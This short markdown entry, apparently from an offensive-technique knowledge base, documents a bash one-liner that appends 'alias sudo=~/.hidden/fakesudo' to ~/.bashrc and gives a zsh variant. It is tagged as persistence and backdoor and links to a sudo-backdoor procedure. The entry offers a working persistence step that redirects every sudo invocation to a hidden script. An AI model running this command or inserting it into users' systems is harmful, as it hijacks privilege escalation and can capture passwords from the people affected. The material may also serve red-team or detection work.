---
type: command
executor: bash
data: echo \"alias sudo=~/.hidden/fakesudo\" >> ~/.bashrc
platforms:
  - Linux
  - Unix
tags:
  - persistence
  - backdoor
verified: true
validated: true
---

# create-sudo-alias-in-bashrc

## Command

```bash
echo "alias sudo=~/.hidden/fakesudo" >> ~/.bashrc
```

## Description

Appends an alias to the .bashrc file, redirecting all 'sudo' invocations to the fake script in ~/.hidden/fakesudo. This establishes persistence by activating the backdoor on new shell sessions.

## Parameters

| Parameter | Description | Required |
|-----------|-------------|----------|
| "alias sudo=~/.hidden/fakesudo" | The alias string to append | Yes |
| >> ~/.bashrc | Append to bash profile | Yes |

## Examples

### Basic Usage

```bash
echo "alias sudo=~/.hidden/fakesudo" >> ~/.bashrc
```

### For Zsh Compatibility

```bash
echo "alias sudo=~/.hidden/fakesudo" >> ~/.zshrc
```

## Expected Output

No output on success. The alias is added to the end of the file.

## Related

- [[procedures/Implement-Sudo-Backdoor-via-Bashrc-Alias]]
- [[commands/make-fakesudo-executable]]
